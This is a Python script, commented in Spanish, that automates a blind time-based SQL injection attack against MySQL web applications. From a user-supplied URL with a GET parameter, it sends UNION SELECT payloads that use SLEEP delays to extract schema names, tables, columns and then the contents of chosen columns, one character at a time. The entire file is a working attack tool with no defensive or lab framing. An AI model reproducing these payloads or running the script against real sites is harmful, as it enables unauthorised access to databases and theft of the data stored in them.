#!/usr/bin/python3
# For 1 column, adecuate it for more
from pwn import *
import string, requests, time, argparse, signal, sys

def handler(sig, frame):
    print("\n\n[i] SALIENDO\n")
    sys.exit(1)

#Decimos que es lo que tenemos que hacer cuando demos CTRL+C
signal.signal(signal.SIGINT, handler) 

# Códigos de colores ANSI
NEGRO = '\033[30m'
ROJO = '\033[31m'
VERDE = '\033[32m'
AMARILLO = '\033[33m'
AZUL = '\033[34m'
MAGENTA = '\033[35m'
CIAN = '\033[36m'
BLANCO = '\033[37m'

# Estilos
NEGRITA = '\033[1m'
SUBRAYADO = '\033[4m'

# Fondos
FONDO_NEGRO = '\033[40m'
FONDO_ROJO = '\033[41m'
FONDO_VERDE = '\033[42m'
FONDO_AMARILLO = '\033[43m'
FONDO_AZUL = '\033[44m'
FONDO_MAGENTA = '\033[45m'
FONDO_CIAN = '\033[46m'
FONDO_BLANCO = '\033[47m'

# Restablecer color a los valores predeterminados
RESET = '\033[0m'

caracteres = string.printable

def getARG():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL with the GET PARAM example (http://example.com/example.php?id=2)")
    opcion = parser.parse_args()
    if not opcion.url:
        parser.error("[-] Specify the url for help use -h")
    return opcion

def getStringSize(column_name,from_where,addwhere,where,where2):
    flag=1
    i=0
    leng=0
    while flag:
        if addwhere == 1:
            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
        elif addwhere == 2:
            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
        elif addwhere == 3:
            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({f',0x3a,'.join([f'{i}' for i in column_name])}) FROM {from_where}))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
        else:
            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where}))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
        url=url_W_GET_PARAM+payload
        tiempoi = time.time()
        r = requests.get(url)
        tiempol = time.time()
        tiempot = tiempol - tiempoi
        if tiempot >= 0.45:
            leng=i
            print(f"{AZUL}[{RESET}{CIAN}+{RESET}{AZUL}]{RESET} {BLANCO}String length{RESET}{AZUL} : {RESET}{BLANCO}{i}, now lets dump it....{RESET}")
            flag=0
        i+=1
    return leng


def getSchemas(url, chrs):
    schemas=""
    leng=getStringSize("schema_name","information_schema.schemata",0,"","")
    p2=log.progress("SQLI")
    p2.status("Starting attack ...")
    time.sleep(2)
    progreso = log.progress("SCHEMAS -> ")
    for i in range(1,leng+1):
        for j in chrs:
            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(schema_name) from information_schema.schemata), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
            url=url_W_GET_PARAM+payload
            p2.status(url)
            tiempoi = time.time()
            r = requests.get(url)
            tiempol = time.time()
            tiempot = tiempol - tiempoi
            if tiempot >= 0.5:
                schemas+=j
                progreso.status(schemas)
                break
    return schemas

def getTables(url, chrs, schema):
    tables=""
    leng=getStringSize("table_name","information_schema.tables",1,schema,"")
    p2=log.progress("SQLI")
    p2.status("Starting attack ...")
    time.sleep(2)
    progreso = log.progress("TABLES -> ")
    for i in range(1,leng+1):
        for j in chrs:
            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema = '{schema}'), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
            url=url_W_GET_PARAM+payload
            p2.status(url)
            tiempoi = time.time()
            r = requests.get(url)
            tiempol = time.time()
            tiempot = tiempol - tiempoi
            if tiempot >= 0.5:
                tables+=j
                progreso.status(tables)
    return tables

def getColumns(url,chrs,schema,table):
    columns=""
    leng=getStringSize("column_name","information_schema.columns",2,schema,table)
    p2=log.progress("SQLI")
    p2.status("Starting attack ...")
    time.sleep(2)
    progreso = log.progress("COLUMNS -> ")
    for i in range(1,leng+1):
        for j in chrs:
            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_schema = '{schema}' and table_name = '{table}'), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
            url=url_W_GET_PARAM+payload
            p2.status(url)
            tiempoi = time.time()
            r = requests.get(url)
            tiempol = time.time()
            tiempot = tiempol - tiempoi
            if tiempot >= 0.5:
                columns+=j
                progreso.status(columns)
    return columns

def dumpInfoFromCols(url,chrs,schema,table,cols):
    data=""
    leng=getStringSize(cols,f"{schema}.{table}",3,"","")
    p2=log.progress("SQLI")
    p2.status("Starting attack ...")
    time.sleep(2)
    progreso = log.progress("DUMP -> ")
    for i in range(1,leng+1):
        for j in chrs:
            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat({f',0x3a,'.join([f'{i}' for i in cols])}) from {schema}.{table}), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
            url=url_W_GET_PARAM+payload
            p2.status(url)
            tiempoi = time.time()
            r = requests.get(url)
            tiempol = time.time()
            tiempot = tiempol - tiempoi
            if tiempot >= 0.5:
                data+=j
                progreso.status(data)
    return data
    

def schemasMenu(schema):
    print(f"\n{VERDE}[*]{RESET} {BLANCO}From the following schemas select the one you want to look:{RESET}")
    list_schemas = schema.split(",")
    temp_var=1
    for i in list_schemas:
        print(f"\n\t{AZUL}[{RESET}{CIAN}+{RESET}{AZUL}]{RESET}{BLANCO} {temp_var}{RESET} {AZUL}:{RESET} {BLANCO}{i}{RESET}")
        temp_var+=1
    temp_var=0
    selected_schema=int(input(f"\n{VERDE}[*]{RESET} {BLANCO}From the following schemas select the one you're interested on (pick the number)\n|> {RESET}"))
    schema_to_use=list_schemas[selected_schema-1]
    print(f"\n{AZUL}[i]{RESET} {BLANCO}Retrieving information from {schema_to_use}...{RESET}")
    return schema_to_use

def tablesMenu(tables):
    print(f"\n{VERDE}[*]{RESET} {BLANCO}From the following tables select the one you want to look:{RESET}")
    list_tables = tables.split(",")
    temp_var=1
    for i in list_tables:
        print(f"\n\t{AZUL}[{RESET}{CIAN}+{RESET}{AZUL}]{RESET}{BLANCO}  {temp_var} {RESET}{AZUL}:{RESET}{BLANCO} {i}{RESET}")
        temp_var+=1
    temp_var=0
    selected_table=int(input(f"\n{VERDE}[*]{RESET}{BLANCO} From the following tables select the one you're interested on (pick the number)\n|> {RESET}"))
    table_to_use=list_tables[selected_table-1]
    print(f"\n{AZUL}[i]{RESET}{BLANCO} Retrieving information from {table_to_use}...{RESET}")
    return table_to_use

def columnsMenu(columns):
    flag=1
    cols2look=[]
    print(f"\n{VERDE}[*]{RESET}{BLANCO} From the following columns select the one you want to look:{RESET}")
    list_columns = columns.split(",")
    temp_var=1
    for i in list_columns:
        print(f"\n\t{AZUL}[{RESET}{CIAN}+{RESET}{AZUL}]{RESET}{BLANCO} {temp_var}{RESET} {AZUL}:{RESET}{BLANCO} {i}{RESET}")
        temp_var+=1
    temp_var=0
    while flag:
        col=int(input(f"\n{VERDE}[*]{RESET}{BLANCO} From the following columns select the one you're interested on (pick the number)\n|> {RESET}"))
        cols2look.append(list_columns[col-1])
        cont = str(input(f"\n{AMARILLO}[?]{RESET}{BLANCO} Do you want to continue adding columns to dump? (YES/NO)\n{RESET}|> "))
        if cont.lower() == "no\n":
            flag=0
            break
    print(f"\n{AZUL}[i]{RESET}{BLANCO} Retrieving information from {cols2look}...{RESET}")
    return cols2look

def showDump(information):
    print(f"\n{VERDE}[*]{RESET}{BLANCO} All the information dumped: \n------------------------------------------------------------\n{RESET}")
    info_list = information.split(",")
    for i in info_list:
        print(f"{BLANCO}\n\t {i}{RESET}")
    print(f"\n\n------------------------------------------------------------\n\n{ROJO}[pwn]{RESET}{BLANCO} DONE!{RESET}\n")

def run():
    schema = getSchemas(url_W_GET_PARAM,caracteres)
    schema_to_use = schemasMenu(schema)
    tables = getTables(url_W_GET_PARAM,caracteres,schema_to_use)
    table_to_use = tablesMenu(tables)
    columns = getColumns(url_W_GET_PARAM,caracteres,schema_to_use,table_to_use)
    cols2look = columnsMenu(columns)
    information = dumpInfoFromCols(url_W_GET_PARAM,caracteres,schema_to_use,table_to_use,cols2look)
    showDump(information)

print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} BLIND TIME BASED SQLI AUTOMATED SCRIPT (AGAINST MYSQL) {RESET}{MAGENTA}-----{RESET}\n")
option = getARG()
url_W_GET_PARAM = option.url
run()
